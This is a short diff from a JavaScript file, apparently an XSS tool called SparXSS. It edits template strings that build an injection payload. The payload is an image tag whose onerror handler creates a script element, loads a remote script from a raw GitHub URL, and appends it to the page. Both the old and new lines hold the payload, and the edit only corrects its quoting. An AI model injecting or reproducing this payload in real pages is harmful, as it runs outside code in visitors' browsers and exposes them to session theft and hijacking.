@@ -792,10 +792,13 @@ if (typeof executed === 'undefined') {
                 `;
 
                 var codeBeginning = `
-                    <img src=# onerror="var scriptElement=document.createElement("script");scriptElement.src="https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js";scriptElement.onload=
+                    <img src="#" onerror="var scriptElement = document.createElement('script');
+                    scriptElement.src = 'https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js';
+                    scriptElement.onload = function () {
                 `;
                 
                 var codeEnd = `
+                    };
                     document.body.appendChild(scriptElement);">
                 `;
         
